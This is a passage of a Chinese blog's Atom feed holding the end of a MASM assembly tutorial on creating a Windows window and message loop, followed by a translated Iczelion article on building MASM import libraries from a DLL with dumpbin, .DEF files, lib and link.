hwnd，CmdShow</span><br><span class="line">invoke UpdateWindow， hwnd</span><br></pre></td></tr></table></figure><p>调用<code>CreateWindowEx</code>成功后，窗口句柄在eax中。我们必须保存该值以备后用。我们刚刚产生的窗口不会自动显示，所以必须调用 <code>ShowWindow</code> 来按照我们希望的方式来显示该窗口。接下来调用 <code>UpdateWindow</code> 来更新客户区。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.WHILE TRUE</span><br><span class="line">invoke GetMessage， ADDR msg，NULL，0，0</span><br><span class="line">.BREAK .IF (!eax)</span><br><span class="line">invoke TranslateMessage， ADDR msg </span><br><span class="line">invoke DispatchMessage， ADDR msg</span><br><span class="line">.ENDW</span><br></pre></td></tr></table></figure><p>这时候我们的窗口已显示在屏幕上了。但是它还不能从外界接收消息。所以我们必须给它提供相关的消息。我们是通过一个<strong>消息循环</strong>来完成该项工作的。每一个模块仅有一个消息循环，我们不断地调用 <code>GetMessage</code> 从 Windows 中获得消息。<code>GetMessage</code> 传递一个 MSG 结构体给 Windows ，然后 Windows 在该函数中填充有关的消息，一直到 Windows 找到并填充好消息后 <code>GetMessage</code> 才会返回。在这段时间内系统控制权可能会转移给其他的应用程序。这样就构成了Windows 下的多任务结构。如果 <code>GetMessage</code> 接收到 <code>WM_QUIT</code> 消息后就会返回 <code>FALSE</code>，使循环结束并退出应用程序。<code>TranslateMessage</code> 函数是一个是实用函数，它从键盘接受原始按键消息，然后解释成 <code>WM_CHAR</code>，再把 <code>WM_CHAR</code> 放入消息队列，由于经过解释后的消息中含有按键的 ASCII 码，这比原始的扫描码好理解得多。<strong>如果您的应用程序不处理按键消息的话，可以不调用该函数。</strong><code>DispatchMessage</code> 会把消息发送给负责该窗口过程的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，msg.wParam</span><br><span class="line">ret</span><br><span class="line">WinMain endp</span><br></pre></td></tr></table></figure><p>如果消息循环结束了，退出码存放在 MSG 中的 wParam中，您可以通过把它放到 eax 寄存器中传给 Windows，目前 Windows 没有利用到这个结束码，但我们最好还是遵从 Windows 规范已防意外。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WndProc proc hWnd：HWND， uMsg：UINT， wParam：WPARAM， lParam：LPARAM</span><br></pre></td></tr></table></figure><p>是我们的窗口处理函数。您可以随便给该函数命名。其中第一个参数 hWnd 是接收消息的窗口的句柄。uMsg 是接收的消息。注意 uMsg 不是一个 MSG 结构，其实上只是一个 DWORD 类型数。Windows 定义了成百上千个消息，大多数您的应用程序不会处理到。当有该窗口的消息发生时，Windows 会发送一个相关消息给该窗口。其窗口过程处理函数会智能的处理这些消息。wParam 和 lParam 只是附加参数，以方便传递更多的和该消息有关的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.IF uMsg==WM_DESTROY</span><br><span class="line">invoke PostQuitMessage，NULL</span><br><span class="line">.ELSE </span><br><span class="line">invoke DefWindowProc，hWnd，uMsg，wParam，lParam</span><br><span class="line">ret</span><br><span class="line">.ENDIF</span><br><span class="line">xor eax，eax </span><br><span class="line">ret</span><br><span class="line">WndProc endp</span><br></pre></td></tr></table></figure><p><strong>上面可以说是关键部分。这也是我们写 Windows 程序时需要改写的主要部分。</strong>此处您的程序检查 Windows 传递过来的消息，如果是我们感兴趣的消息则加以处理，处理完后，在 eax 寄存器中传递 0，否则必须调用 <code>DefWindowProc</code>，把该窗口过程接收到的参数传递给缺省的窗口处理函数。所有消息中您<strong>必须处理的是 <code>WM_DESTROY</code></strong>，当您的应用程序结束时 Windows 把这个消息传递进来，当您的应用程序接收到该消息时它已经在屏幕上消失了，这仅是通知您的应用程序窗口已销毁，您必须自己准备返回 Windows 。在此消息中您可以做一些清理工作，但无法阻止退出应用程序。如果您要在窗口销毁前做一些额外工作，可以处理 <code>WM_CLOSE</code> 消息。在处理完清理工作后，您必须调用 <code>PostQuitMessage</code>，该函数会把 <code>WM_QUIT</code> 消息传回您的应用程序，而该消息会使得 GetMessage 返回，并在 eax 寄存器中放入 0，然后会结束消息循环并退回 WINDOWS。您可以在您的程序中调用 <code>DestroyWindow</code> 函数，它会发送一个 WM_DESTROY 消息给您自己的应用程序，从而迫使它退出。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>怎样建立你自己的MASM导入库</title>
    <link href="http://hacktech.cn/2018/02/06/%E6%80%8E%E6%A0%B7%E5%BB%BA%E7%AB%8B%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84MASM%E5%AF%BC%E5%85%A5%E5%BA%93.html"/>
    <id>http://hacktech.cn/2018/02/06/怎样建立你自己的MASM导入库.html</id>
    <published>2018-02-06T12:00:49.000Z</published>
    <updated>2018-09-08T06:50:11.311Z</updated>
    
    <content type="html"><![CDATA[<p>by Iczelion （翻译：花心萝卜<a href="mailto:yqzq@163.net" target="_blank" rel="noopener">yqzq@163.net</a>) 9.5.2000</p><p>这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。</p><a id="more"></a><hr><h2 id="MASM导入库的格式："><a href="#MASM导入库的格式：" class="headerlink" title="MASM导入库的格式："></a>MASM导入库的格式：</h2><hr><p>MASM和VC++可以使用相同的导入库，MS导入库使用不同于TASM的OMF格式的变更的COFF文件格式，这就是为什么TASM和MASM的导入库不能互用的原因，我将不详细介绍有关MS导入库的格式。可以这样说，每一个MS导入库都包含某个DLL中函数的信息（你将要用这些信息来调用DLL中的函数），这些信息包括函数名和它所有参数的尺寸。如果你用一个文本编辑器打开kernel32.lib，你回发现一些如下格式的信息：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ExitProcess@4 </span><br><span class="line">_CreateProcessA@40</span><br></pre></td></tr></table></figure><p>函数名被装饰上了一个“_”，在“@”之后的数字表示了该函数所有参数的尺寸（字节为单位），ExitProcess 函数只有一个DWORD的参数，所以后面的数字是4。 LIB中为什么要包含这些参数尺寸的信息呢？当你用INVOKE调用函数时，这些信息被用来检测传递给函数的参数是否正确。如果你使用“手工”将参数压入堆栈，并通过“CALL”来调用函数的话，MASM将无法检测参数是否正确。这将导致我们几乎没有办法建立一个DLL的导入库，因为DLL并不包含清楚的关于参数尺寸的信息。</p><hr><h2 id="从DLL建立MASM导入库"><a href="#从DLL建立MASM导入库" class="headerlink" title="从DLL建立MASM导入库"></a>从DLL建立MASM导入库</h2><hr><p>如果你很乐意用“手动”（CALL）的方法去调用函数的话，你可以象下面这样为任何一个DLL建立MASM的导入库：<br>使用dumpbin.exe,它可以导出DLL 输出（EXPORT）函数的名字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumpbin /EXPORTS  blah.dll  &gt;  output.txt</span><br></pre></td></tr></table></figure></p><p>在你获得了函数名列表之后，通过他们建立一个模块定义文件（.DEF）。 举个例子：如果DLL只包含一个函数：GetSomeLine 在一个文本文件中输入如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY blah </span><br><span class="line">EXPORTS </span><br><span class="line">GetSomeLine</span><br></pre></td></tr></table></figure><p>并将其保存为“blah.def<br>象这样，运行lib.exe，通过模块定义文件建立一个导入库：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib /DEF:blah.def</span><br></pre></td></tr></table></figure><p>就是它了！你将获得blah.lib,只要你不使用INVOKE调用函数的话，你就可以在MASM中使用它。</p><hr><h2 id="建立通过INVOKE调用函数的MASM导入库"><a href="#建立通过INVOKE调用函数的MASM导入库" class="headerlink" title="建立通过INVOKE调用函数的MASM导入库:"></a>建立通过INVOKE调用函数的MASM导入库:</h2><hr><p>我并不反对你使用上面的方法，但INVOKE确实是一个调用函数的好途径。这也是我较TASM更喜欢MASM的原因之一。但就象我早先强调的，我们几乎不可能从一个DLL建立一个能100%工作的MASM导入库。如果你使用INVOKE，你将不能用上面的方法建立一个MASM导入库。举个例子，你可以想象如果你在.DEF文件中修改了函数的“@XX”部分，导入库将仍然正常建立，但请相信我，他不会工作的。 建立一个可以使用INVOKE的导入库的一个简单的方法是使用MASM。如果你写过DLL的代码，你会发现你不仅的到了一个DLL，而且还得到了一个导入库，没错，它就是我们要得！ 我们的策略是： </p><ol><li>获得函数名和所有参数的尺寸</li><li>建立一个包含正确个数和尺寸的DLL源代码 </li><li>建立一个描述ASM源代码中相应函数的模块定义文件（.DEF） </li><li>将源代码按DLL汇编 </li></ol><p>你将获得一个功能完全的MASM导入库，上面的步骤应做更多的说明 </p><hr><h2 id="获得函数名和所有参数尺寸"><a href="#获得函数名和所有参数尺寸" class="headerlink" title="获得函数名和所有参数尺寸"></a>获得函数名和所有参数尺寸</h2><hr><p>这是我们处理过程中最困难的部分了。如果你仅仅只有DLL，你将经历无意义的冒险。下面是我所能想出的方法，不过没有一个能100%工作。  </p><p>使用交互式反编译工具（Interactive Disassembler (IDA)）反编译DLL，通过这个奇妙的工具，你可以获得函数参数的大概尺寸，但这些信息是不完全的，IDA是一个功能强大的工具，不过有时必须靠我们自己判断什么是什么。你将不得不仔细分析反编译后的结果。  </p><p>观察堆栈指针在调用函数之前和之后的值。方法如下：  </p><ol><li>通过GetProcAddress获得函数的地址。</li><li>调用想要测试的每一个函数，但请注意，调用这些函数时，不要给他们传递任何的参数。调用前请注意ESP的值。</li><li>当函数返回后，比较调用函数前、后ESP的值。基本原理是：stdcall参数调用协定规定，函数自己负责恢复堆栈，现在知道为什么我们要不传递任何参数了吧，我们没传递参数，而函数却自作聪明“恢复”了ESP指针，所以ESP的变化值就是我们要得参数尺寸了。</li></ol><p>不过，上面的方法并不是万无一失的，下面的这些情况将会导致失败：</p><ul><li>如果DLL中的函数使用了不同于stdcall的别的参数传递协定。</li><li>如果函数在恢复堆栈时失败，我们将无法得到ESP的正确值。</li><li>如果这个函数的作用是去做一些危险的事情，比如硬盘格式化，那我们即使得到了ESP，恐怕代价大了点</li></ul><p>研究现有的使用DLL的程序，你可以通过调试/反编译这些程序去获得函数参数的个数和尺寸。不论如何，只要有函数在DLL中，而又没有任何程序调用过它，你可以用上面的两个方法。 </p><hr><h2 id="建立我们自己的DLL"><a href="#建立我们自己的DLL" class="headerlink" title="建立我们自己的DLL"></a>建立我们自己的DLL</h2><hr><p>在你获得了函数的名字和参数尺寸后，你可以建立一个DLL框架并在框架中添加和其他DLL、文件中的相同名称的函数。举个例子，如果DLL只含有一个函数：GetSomeLine.它有16BYTES的参数。在ASM文件中，你可以这样写： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>你可能要问，“这是什么？”。一个没有处理部分的程序？请记住：一个导入库并没有记录一个函数是如何实现的，它只是记录函数名和参数尺寸而已，它的任务就是提供函数的名称和尺寸。所以我们不需要添加函数的处理部分。当我们建立DLL时，MASM会帮我们完成它的导入库的建立。 MASM在建立导入库时并不关心每个具体参数的尺寸，它总是象下面这样：<br>　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>然后MASM将在导入库中建立_GetSomeLine@16(它会把每一个参数看作DWORD)，而并不管它的参数是4个BYTE还是DWORD或是其他什么</p><hr><h2 id="建立匹配的模块定义文件（-DEF）"><a href="#建立匹配的模块定义文件（-DEF）" class="headerlink" title="建立匹配的模块定义文件（.DEF）"></a>建立匹配的模块定义文件（.DEF）</h2><hr><p>这是一个简单的工作，你需要这个文件来指导MASM去建立正确的DLL和与之匹配的导入库。一个模块定义文件模板如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY  &lt;The name of the DLL&gt; </span><br><span class="line">EXPORTS </span><br><span class="line">&lt;The names of the functions&gt;</span><br></pre></td></tr></table></figure><p>你仅仅需要填入DLL的名字，然后在EXPORTS下添入函数的名字。每个函数名一行。保存文件，你将获得一个模块定义文件。 </p><hr><h2 id="汇编DLL源代码"><a href="#汇编DLL源代码" class="headerlink" title="汇编DLL源代码"></a>汇编DLL源代码</h2><hr><p>最后一步也是最简单的一步，仅仅需要ML.EXE和LINK.EXE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ml /c /coff /Cp blah.asm </span><br><span class="line">link /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj</span><br></pre></td></tr></table></figure></p><p>好了，查看一下你的项目目录，你会发现你想要的导入库和DLL。</p><p><strong>转自<a href="http://blog.csdn.net/taowen2002/article/details/15837" target="_blank" rel="noopener">http://blog.csdn.net/taowen2002/article/details/15837</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;by Iczelion （翻译：花心萝卜&lt;a href=&quot;mailto:yqzq@163.net&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;yqzq@163.net&lt;/a&gt;) 9.5.2000&lt;/p&gt;
&lt;p&gt;这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
</feed>
